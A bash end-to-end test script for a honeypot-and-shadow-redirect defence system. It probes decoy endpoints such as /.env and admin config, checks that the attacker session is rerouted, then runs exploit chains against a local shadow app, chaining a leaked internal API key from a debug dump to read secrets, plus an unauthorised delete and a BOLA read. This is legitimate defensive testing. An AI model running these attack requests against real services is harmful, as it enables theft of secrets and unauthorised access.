#!/bin/bash
# End-to-end test of Option D: shadow redirect + exploit detection
#
# Flow tested:
# 1. Normal user traffic (should stay on prod, no alerts)
# 2. Attacker hits honeypots (session scored)
# 3. Attacker gets redirected to shadow (verify via nginx log)
# 4. Attacker exploits vuln chains in shadow (flags captured)
# 5. Verify chain detector sees completed exploits

BASE="http://localhost:8888"
CP="http://localhost:9090"

echo "=== OPTION D END-TO-END TEST ==="
echo "Started: $(date)"
echo ""

# Clear state
> /home/sean/reactive_defender/logs/nginx/access.log
rm -f /home/sean/reactive_defender/events/*.json 2>/dev/null
docker exec defender-redis redis-cli FLUSHALL > /dev/null 2>&1

# ── Phase 1: Normal user ──────────────────────────────────────
echo "== Phase 1: Normal user traffic (should be prod, 0 alerts) =="
for i in $(seq 1 5); do
  curl -s "$BASE/" > /dev/null
  curl -s "$BASE/identity/api/v2/user/dashboard" > /dev/null
done
ENV=$(tail -5 /home/sean/reactive_defender/logs/nginx/access.log | awk -F'env="' '{print $2}' | cut -d'"' -f1 | sort -u)
echo "  Routing: $ENV"
echo "  Control plane: $(curl -s $CP/control/status | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'shadow_sessions={d[\"shadow_redirected_sessions\"]}')" 2>/dev/null)"
echo ""

# ── Phase 2: Attacker starts probing ──────────────────────────
echo "== Phase 2: Attacker hits honeypots =="

# Register + login as attacker
curl -s -X POST "$BASE/identity/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{"name":"E2E Attacker","email":"e2e-attacker@evil.com","password":"Passw0rd!","number":"5559990001"}' > /dev/null 2>&1

TOKEN=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"e2e-attacker@evil.com","password":"Passw0rd!"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
echo "  Attacker token: ${TOKEN:0:30}..."

# Check current score
echo "  Score before: $(curl -s "$CP/control/session/score/Bearer%20$TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token_score',0))" 2>/dev/null)"

# Hit honeypot endpoints
echo "  Hitting honeypots..."
curl -s "$BASE/.env" > /dev/null
curl -s "$BASE/identity/api/v3/admin/users" > /dev/null
curl -s "$BASE/identity/api/v3/admin/config" > /dev/null
curl -s "$BASE/identity/api/debug/tokens" > /dev/null
curl -s "$BASE/workshop/api/internal/config" -H "Authorization: Bearer $TOKEN" > /dev/null

# Score the session (simulating what the Watcher+Orchestrator would do)
echo "  Scoring session..."
curl -s -X POST "$CP/control/session/score" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"Bearer $TOKEN\",\"ja3\":\"curl-e2e-test\",\"event_type\":\"honeypot_v3_admin\",\"severity\":\"critical\"}" > /dev/null

SCORE=$(curl -s "$CP/control/session/score/Bearer%20$TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'score={d[\"token_score\"]}, shadow={d[\"is_redirected_to_shadow\"]}')" 2>/dev/null)
echo "  After honeypots: $SCORE"
echo ""

# ── Phase 3: Verify redirect ─────────────────────────────────
echo "== Phase 3: Verify transparent redirect =="

# Make a request with the flagged token
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard" > /dev/null
sleep 1

# Check nginx log for routing
LAST_ENV=$(tail -1 /home/sean/reactive_defender/logs/nginx/access.log | awk -F'env="' '{print $2}' | cut -d'"' -f1)
echo "  Last request routed to: $LAST_ENV"

# Verify via control plane
ROUTE=$(curl -s "$CP/control/session/check" -H "X-Auth-Token: Bearer $TOKEN" -H "X-JA3-Hash: curl-e2e-test" | python3 -c "import sys,json; print(json.load(sys.stdin).get('target','?'))" 2>/dev/null)
echo "  Control plane says: $ROUTE"

# New token, same JA3 — should also go to shadow
ROUTE2=$(curl -s "$CP/control/session/check" -H "X-Auth-Token: Bearer new-token-xyz" -H "X-JA3-Hash: curl-e2e-test" | python3 -c "import sys,json; print(json.load(sys.stdin).get('target','?'))" 2>/dev/null)
echo "  New token, same JA3: $ROUTE2"
echo ""

# ── Phase 4: Attacker exploits in shadow ──────────────────────
echo "== Phase 4: Exploit chains (attacker is now in shadow) =="

# Chain 1: API Key (custom chain — always on vuln-chains service)
echo "  Chain 1 (API Key):"
F1=$(curl -s -H "X-Internal-Key: $(curl -s "$BASE/chains/apikeys/debug/dump?token=e6f1" | python3 -c "import sys,json; print(json.load(sys.stdin)['dump']['internal_api_key'])" 2>/dev/null)" "$BASE/chains/apikeys/admin/secrets" | python3 -c "import sys,json; [print(s['value']) for s in json.load(sys.stdin)['secrets'] if 'XVEH' in s['value']]" 2>/dev/null)
echo "    $F1"

# Chain 9: Video Delete
echo "  Chain 9 (Video Delete):"
F9=$(curl -s -X DELETE "$BASE/identity/api/v2/user/videos/1" -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json,re; m=re.search(r'XVEH\{[^}]+\}',json.load(sys.stdin).get('message','')); print(m.group(0) if m else 'NOT FOUND')" 2>/dev/null)
echo "    $F9"

# Chain 5: BOLA Vehicle (community post)
echo "  Chain 5 (BOLA Vehicle):"
F5=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/community/api/v2/community/posts/recent" | python3 -c "
import sys,json,re
d=json.load(sys.stdin)
for p in d.get('posts',[]):
    m=re.search(r'XVEH\{[^}]+\}',p.get('content',''))
    if m: print(m.group(0)); break
" 2>/dev/null)
echo "    $F5"

echo ""

# ── Phase 5: Shadow status ────────────────────────────────────
echo "== Phase 5: Shadow environment status =="
curl -s "$CP/control/shadow/status" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print(f'  Redirected tokens: {d[\"redirected_tokens\"]}')
print(f'  Redirected JA3s: {d[\"redirected_ja3s\"]}')
print(f'  Recent redirects: {len(d[\"recent_redirects\"])}')
" 2>/dev/null

echo ""
echo "== Phase 6: Nginx routing summary =="
PROD=$(grep 'env="prod"' /home/sean/reactive_defender/logs/nginx/access.log | wc -l)
SHADOW=$(grep 'env="shadow"' /home/sean/reactive_defender/logs/nginx/access.log | wc -l)
NONE=$(grep -v 'env="' /home/sean/reactive_defender/logs/nginx/access.log | wc -l)
echo "  Requests routed to prod: $PROD"
echo "  Requests routed to shadow: $SHADOW"
echo "  Requests with no env tag: $NONE"

echo ""
echo "=== E2E TEST COMPLETE ==="
echo "Finished: $(date)"
